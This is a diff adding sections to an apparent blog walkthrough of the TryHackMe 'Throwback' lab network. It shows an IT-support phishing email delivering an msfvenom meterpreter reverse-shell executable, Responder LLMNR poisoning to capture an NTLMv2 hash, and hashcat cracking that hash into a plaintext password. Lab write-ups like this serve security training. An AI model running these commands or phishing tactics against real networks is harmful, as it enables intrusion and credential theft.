@@ -239,9 +239,55 @@ hydra -L mail_users.txt -P mail_pass.txt 10.200.29.232 http-post-form '/src/redi
 And successfully found these users' passwords:
 ![hydra found passwords](/assets/img/posts/throwback/14_hydra_found.webp)
 
+### Phishing
+---
+At this point however, I needed a way to move to another machine on the network. And the next target was WS01, an employee workstation.
+
+To get access to a workstation, I chose to launch a phishing campaign against the employee email list, posing as IT support, telling employee's to update the note-taking software they're using, which would actually be a reverse shell pointing back to me.
+
+I used the following MSFVenom command to generate a reverse shell exe:
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o shell.exe
+```
+
+And the following email as the vehicle:
+![phishing email](/assets/img/posts/throwback/15_phishing_email.webp)
+
+Setup a handler using msfconsole:
+![msfconsole handler](/assets/img/posts/throwback/16_handler.webp)
+
+And got a meterpreter shell as the user **BlaireJ** on their workstation:
+![meterpreter shell](/assets/img/posts/throwback/17_meterpreter_shell.webp)
 
 
+### Flags
 
+From here, I found the 2 flags for the machine with ease. The first being on BlaireJ's desktop:
+![flag 5](/assets/img/posts/throwback/18_flag5.webp)
 
+And the second on HumphreyW's desktop:
+![flag 6](/assets/img/posts/throwback/19_flag6.webp)
+
+### LLMNR Poisoning
+
+Then, with the shell open, I used this responder command:
+
+```shell
+sudo responder -I tun0 -dw -v
+```
+
+To spoof the destination of LLMNR requests on the network, and recieve **PetersJ**'s NTMLv2 hash, which was intended for BlaireJ.
+
+![llmnr poisoning](/assets/img/posts/throwback/20_poison.webp)
+
+This hash would take a very long time to crack on my laptop, so I used [Penglab](https://github.com/mxrch/penglab) to use a much faster machine with a GPU via Google Collab.
+
+On Penglab, I used this hashcat command (with [this](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) rule):
+```shell
+hashcat -m 5600 -r OneRuleToRuleThemAll.rule --force petersj.hash.txt /content/wordlists/rockyou.txt
+```
+
+And successfully cracked PetersJ's password `Throwback317`:
+![petersjs password cracked](/assets/img/posts/throwback/21_petersj_cracked.webp)
 
 [Throwback]: https://tryhackme.com/room/throwback
